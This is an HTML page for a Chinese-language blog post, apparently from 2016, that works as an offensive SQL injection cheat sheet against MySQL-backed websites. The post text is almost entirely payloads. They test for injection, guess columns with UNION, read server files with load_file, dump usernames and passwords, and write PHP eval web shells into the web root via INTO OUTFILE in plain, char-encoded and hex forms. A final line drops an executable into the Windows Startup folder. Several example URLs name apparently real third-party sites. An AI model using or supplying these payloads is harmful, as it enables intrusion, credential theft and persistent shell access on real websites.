@@ -1,0 +1,302 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="theme-color" content="#1b7aca">
+  <link rel="icon" href="/icon.jpg">
+  <meta name="application-name" content="Hexo"/>
+  <meta name="msapplication-TileColor" content="#1b7aca"/>
+  <meta name="msapplication-square70x70logo" content="/icon.jpg" />
+  <meta name="msapplication-square150x150logo" content="/icon.jpg" />
+  <meta name="msapplication-wide310x150logo" content="/icon.jpg" />
+  <meta name="msapplication-square310x310logo" content="/icon.jpg" />
+  <meta name="msapplication-notification" content="frequency=30; polling-uri=/atom.xml" />
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="apple-touch-icon" href="/icon.jpg">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <link rel="apple-touch-startup-image" href="/icon.jpg">
+
+  
+  <title>sql注入步骤 | Hexo</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="1.判断是否存在注入,加’;and 1=1;and 1=22.判断版本 and ord(mid(version(),1,1))&amp;gt;51 / 返回正常说明是4.0以上版本，可以用union查询3.利用order by 暴字段，在网址后加 order by 10 / 如果返回正常说明字段大于104.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sql注入步骤"/>
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  
+    <link href="/css/animate.css" rel="stylesheet">
+  
+  
+    <script src="/js/jquery-2.0.3.min.js"></script>
+  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script>
+    if (window.location.href.indexOf("")<0) {      location.href = location.href.replace(location.host, "");    }
+  </script>
+
+</head>
+
+
+<body>
+<!--[if lt IE9]>
+<script>
+alert("Please Update Your IE \n请升级您的IE浏览器");
+</script>
+< ![endif]-->
+  <header id="header" class="header header--fixed hide-from-print animated slideInDown"><div class="alignleft backtohome">
+  <a href="/">
+    <img id="icon-photo-small" class="personal-photo  animated rotateIn" src="/icon.jpg" alt="John Doe">
+  </a>
+  <h1 id="title-mini" class=""><a href="/">Hexo</a></h1>
+</div>
+<a target="_blank" id="mini-toggle" class="more icon alignright"></a>
+<nav id="main-nav" class="alignright animated slideInRight">
+
+    
+    
+      <a target="_blank" class="icon twitter" href="http://twitter.com/1ittlecup"></a>
+    
+    
+    
+      <a target="_blank" class="icon googleplus" href="http://plus.google.com/+RuoxinHe"></a> 
+    
+    
+    
+    
+    
+    
+      <a target="_blank" class="icon zhihu" href="http://zhihu.com/people/1ittlecup"></a>
+    
+    
+    
+  <div class="clearfix"></div>
+</nav>
+
+</header>
+  <aside id="sidebar" class="alignleft animated slideInLeft"><div class="personal-info">
+  <figure>
+    
+    <div  class="backtohome">
+      <a href="/">
+        <img id="icon-photo-normal" class="personal-photo animated rotateIn" src="/icon.jpg" alt="John Doe">
+      </a>
+    </div>
+    
+    <figcaption>
+      <h3 class=>John Doe</h3>
+      <p></p>
+    </figcaption>
+  </figure>
+  <section class="social">
+    
+    
+      <a target="_blank" class="icon twitter depth" href="http://twitter.com/1ittlecup"></a>
+    
+    
+    
+      <a target="_blank" class="icon googleplus depth" href="http://plus.google.com/+RuoxinHe"></a> 
+    
+    
+    
+    
+    
+    
+      <a target="_blank" class="icon zhihu depth" href="http://zhihu.com/people/1ittlecup"></a>
+    
+    
+    
+  </section>
+</div>
+<div class="theme-info">
+  <a target="_blank" href="https://github.com/heruoxin/hexo-persona-color" class="html5"> Persona Color Theme</a> 
+  &copy; - 2016 John Doe
+  
+</div>
+</aside>
+  <div id="content" class="inner">
+    <p id="header-fix"></p>
+    <div id="main-col" class="alignright"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon depth"></div>
+        <time class="depth" datetime="2016-07-13T02:28:00.000Z"><a href="#">2016-07-13</a></time>
+      
+      
+  
+    <h1 class="depth title">sql注入步骤</h1>
+  
+
+    </header>
+    <div class="entry depth">
+      
+        <p>1.判断是否存在注入,加’;and 1=1;and 1=2<br>2.判断版本 and ord(mid(version(),1,1))&gt;51 /<em> 返回正常说明是4.0以上版本，可以用union查询<br>3.利用order by 暴字段，在网址后加 order by 10 /</em> 如果返回正常说明字段大于10<br>4.再利用union来查询准确字段，如: and 1=2 union select 1,2,3,……./<em>直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。<br>5.判断数据库连接帐号有没有写权限，and (select count(</em>) from mysql.user)&gt;0 /<em>如果结果返回错误，那我们只能猜解管理员帐号和密码了。<br>6.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /</em> 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。<br>7.首先猜解user表,如: and 1=2 union select 1,2,3,4,5,6…. from user /<em> 如果返回正常，说明存在这个表。<br>8.知道了表就猜解字段,and 1=2 union select 1,username,3,4,5,6…. from user/</em>如果在2字段显示出字段内容则存在些字段。<br>9.同理再猜解password字段,猜解成功再找后台登录。<br>10.登录后台，上传shell。<br>11.检测是不是root权限 and/<em>*/ord(mid(user(),1,1))=114/</em></p>
+<p>PHP注入小技巧:</p>
+<p>unhex(hex(user()))  unhex把16进制进行转换  hex是16进制</p>
+<p>编码不同的问题，hex()搞不定的话试试convert()函数</p>
+<p>boardrule.php?groupboardid=11111/<strong>/union/</strong>/select/<em>*/concat(user(),0x3f,database(),0x3f,version())/</em></p>
+<p>id=133 and 1=2 union select 1,2,&lt;?php eval($_POST[‘#’]);?&gt;,4,5 into outfile ‘/home/www/htdocs/shell.php’/*</p>
+<p><a href="http://site.com/article.php?id=-1+union+all+select+null,null,concat_ws(0x7,username,password" target="_blank" rel="external">http://site.com/article.php?id=-1+union+all+select+null,null,concat_ws(0x7,username,password</a>) from tbluser/*</p>
+<p><a href="http://www.bitdefenderthailand.com/products.php?id=-1+union+all+select+1,unhex(hex(concat_ws(char(58),login,passwd))),3,4,5,6,7,8,9+" target="_blank" rel="external">http://www.bitdefenderthailand.com/products.php?id=-1+union+all+select+1,unhex(hex(concat_ws(char(58),login,passwd))),3,4,5,6,7,8,9+</a> from+mas_member/*</p>
+<p>如果可以联合查询，但是没有任何字段值显示到页面上的话，就只能采用盲注入的方式一个一个把值暴出来（国外的mysqlbf.pl和mysqlget.exe等等都可以轻松地做到）。</p>
+<p>union select 1,2,3,password,user,6,7,8,9,10,11,12 from mysql.user/* 跑user表</p>
+<p>这里首先列出几个常用的涵数:1:system_user()2:user()3:current_user4:session_user()5:database()6:version()7:load_file()……他们的含义分别如下:</p>
+<p>1:系统用户名.2:用户名.3:当前用户名:4连接数据库的用户名.5:数据库名.6:数据库版本.7:MYSQL读取本地文件的函数</p>
+<p>只要把load_file()放到页面出现的字段上,最好保证有足够位置能显示完你要显示的文件.实在没有足够位置也不紧张,下面我再教你几招.</p>
+<p>1:有时候,你明明确认自己拥有读和写文件的权利,却硬是读不出来文件,或者一片空白.为什么?原因可能是对方的系统在权限配置上做的好,你的USER权限,读不到他ADMINISTRATOR里的文件.NTFS和LINUX都能做到这点.如果你排除以上情况,你就要考虑,是不是你读出来的内容,被浏览器当作HTML,ASP,PHP,ASPX,JSP等等的脚本语言给执行了?譬如你读出来的内容如果含有&lt;&gt;等符号,那么浏览器就会执行你的文件内容,你自然什么都看不到.对付这样的情况,也很简单,我们只要把那些特殊的符号,在读出来的时候,用别的符号去代替他们,这样浏览器就不会去执行他们了!怎么代替?我们有replace(load_file(A),char(B),char(C))函数在!当你读A文件出来的时候,如果里面有B字母或者符号,那么MYSQL会用C字母或者符号去代替B,然后再显示出来.OK.我们这么一换上:replace(load_file(A)),char(60),char(32)).这里一样用的CHAR()函数转换为字母即一旦出现”&lt;”符号,就用空格来代替他.这样就能完整的回显内容给你了.</p>
+<p>例如:<a href="http://www.tian6.com/page.php?fp=newsdetail&amp;id=1885%" target="_blank" rel="external">http://www.tian6.com/page.php?fp=newsdetail&amp;id=1885%</a></p>
+<p>20and%201=2%20union%20select%201,replace(load_file(char</p>
+<p>(68,58,92,97,104,99,98,120,121,92,119,101,98,92,105,110,100,101,120,46,112,104,112)),char(60),char</p>
+<p>(32)),3,4,5,6,7,user()/*</p>
+<p>2:所有的字段位置都不够位置回显,读到的文件不完整哦,又不是上面的原因,那么怎么办呢?这里我们用Substring(str,pos,len)函数解决问题.他的意思是从字符串str的pos位位置起返回len个字符的子串.譬如Substring(load_file(A),50,100)就是把A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.</p>
+<p>into outfile的高级运用!<br>OK.load_file()我们就说那么多了.接下来,我们还有许多的重头戏要来呢!这里,我要说下一个很重要的运用方法,也正是我着重参考剑心几部作品的技术的部分.当我们确定如下几个条件以后:<br>1获得物理路径(into outfile ‘物理路径’) 这样才能写对目录<br>2能够使用union (也就是说需要MYSQL3以上的版本)<br>3对方没有对’进行过滤(因为outfile 后面的 ‘’ 不可以用其他函数代替转换)<br>4就是MYSQL用户拥有file_priv权限(不然就不能写文件 或者把文件内容读出)<br>5对web目录有写权限MS的系统一般都有权限,但是LINUX通常都是rwxr-xr-x 也就是说组跟其他用户都没有权限写操作.</p>
+<p>这里的1,我们一般可以靠数据库出错信息来爆出来,不行的话,也可以通过load_file()来得到.2那是一般都可以的了…3也不多见对’’’过滤的.4有没有权限,我们前面已经测试过的了.5如果不能备份到网站的路径上来,我们也还有别的办法,譬如到starup,run里面去等等社工的办法.而且一般多试试上传目录,图片目录,还是大部分都有读写权限的.<br>OK.需要的条件确定了,那怎么用呢?我们分开两部来说用法.</p>
+<p>用法1:这是中规中矩的用法,大家都知道.就是采用网站有的留言,上传等功能,把你的一句话马弄上去,然后使用</p>
+<p>[Copy to clipboard] [ - ]CODE:<br><a href="http://www.tian6.com/coder.php?id=1" target="_blank" rel="external">http://www.tian6.com/coder.php?id=1</a> and 1=2 union select 1,load_file( /www/home/html/upload/qingyafengping.jpg),3,4,5,6 into outfile ‘/www/home/html/coder.php’/*   你的小马就诞生了.<br>其中/www/home/html/upload/qingyafengping.jpg为你已上传的木马地址.3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.</p>
+<p>用法2,也是重点要说的.上面的方法,局限性还是比较大的,如果网站不给你上传,或者网站过滤上传的内容,那怎么办?不用怕,剑心早在几年前就给我们想到了个好办法.我们只需要直接这么执行URL:</p>
+<p>[Copy to clipboard] [ - ]CODE:<br><a href="http://www.tiany6.com/coder.php?id=1" target="_blank" rel="external">http://www.tiany6.com/coder.php?id=1</a> and 1=2 union select 1,char(这里是你的马的代码,记得转为10进或者16进),3,4,5,6 into outfile ‘/www/home/html/coder.php’/*   这样你的小马也诞生了,不需要上传,也不怕他过滤.<br>譬如</p>
+<p>[Copy to clipboard] [ - ]CODE:<br><a href="http://www.tiany6.com/coder.php?id=1" target="_blank" rel="external">http://www.tiany6.com/coder.php?id=1</a> and 1=2 union select 1,char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62),3,4,5,6 into outfile ‘/www/home/html/coder.php’/<em><br>或者<br>[url]<a href="http://www.tiany6.com/coder.php?id=1[/url" target="_blank" rel="external">http://www.tiany6.com/coder.php?id=1[/url</a>] and 1=2 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293F3E,3,4,5,6 into outfile ‘/www/home/html/coder.php’/</em><br>或者<br>[url]<a href="http://www.tiany6.com/coder.php?id=1[/url" target="_blank" rel="external">http://www.tiany6.com/coder.php?id=1[/url</a>] and 1=2 union select 1,’&lt;?php eval($_POST[cmd])?&gt;’,3,4,5,6 into outfile ‘/www/home/html/coder.php’/*<br>3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.</p>
+<p>%2527就是星点 %<br>看到这个$idx=urldecode($_REQUEST[‘idx’]);猪点没有,可以into outfile %2527D:\new90oo\xhmgg.php%2527/*导出文件!</p>
+<p>用 load data infile 读取文件，命令如下 </p>
+<p>mysql&gt;create table a (cmd text);<br>mysql&gt;load data infile ‘c:\boot.ini’ into table a;<br>mysql&gt;select * from a; </p>
+<p>注入中的语法（未测试） </p>
+<p>id=xxx and 1=2 union select 1,2,3,unhex(mm.exe的十六进制),5 INTO DUMPFILE ‘C:\Documents and Settings\All Users\「开始」菜单\程序\启动\mm.exe’/* </p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <div class="clearfix"></div>
+  </div>
+
+  <footer id="footer" class="inner"></footer>
+  <script src="/js/headroom.min.and.gallery.js"></script>
+<script>
+$("#mini-toggle").click(function () {
+    $( "#main-nav" ).css("display","inline");
+    setTimeout(function(){
+        $( "#main-nav" ).removeClass("slideInRight").addClass("slideOutRight");
+    }, 3000);
+    setTimeout(function(){
+        $( "#main-nav" ).css("display","");
+        $( "#main-nav" ).removeClass("slideOutRight").addClass("slideInRight");
+    }, 3555);
+});
+</script>
+
+<script>
+$("#header").headroom({
+  "tolerance": 0,
+  "offset": 200,
+  "classes": {
+    "initial": "",
+    "pinned": "slideInDown",
+    "unpinned": "slideOutUp"
+  }
+});
+$("#header").headroom("destroy");
+console.log("这网站没彩蛋，不用找了……")
+</script>
+
+<script>
+$("a").click(function () {
+    $( "#icon-photo-small"  ).removeClass( "rotateIn" ).addClass( "rotateOut" );
+    $( "#icon-photo-normal" ).removeClass( "rotateIn" ).addClass( "rotateOut" );
+    setTimeout(function(){
+        $( "#icon-photo-small"  ).removeClass( "rotateOut" ).addClass( "rotateIn" );
+        $( "#icon-photo-normal" ).removeClass( "rotateOut" ).addClass( "rotateIn" );
+    }, 900);
+});
+</script>
+
+
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-46393541-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+<!--[if lt IE 9]><script src="/js/excanvas.js"></script><![endif]-->
+<script src="/js/jquery.tagcanvas.min.js"></script>
+ <script type="text/javascript">
+ $(document).ready(function() {
+   if( ! $('#myCanvas').tagcanvas({
+     textColour : '#6d6d6d',
+     outlineThickness : 1,
+     textHeight: 20,
+     maxSpeed : 0.04,
+     depth : 0.75
+   })) {
+     // TagCanvas failed to load
+     $('#myCanvasContainer').hide();
+   }
+   // your other jQuery stuff here...
+ });
+ </script>
+
+
+<script src="/js/pangu.js"></script>
+<script>pangu.page_spacing();</script>
+
+
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+</html>
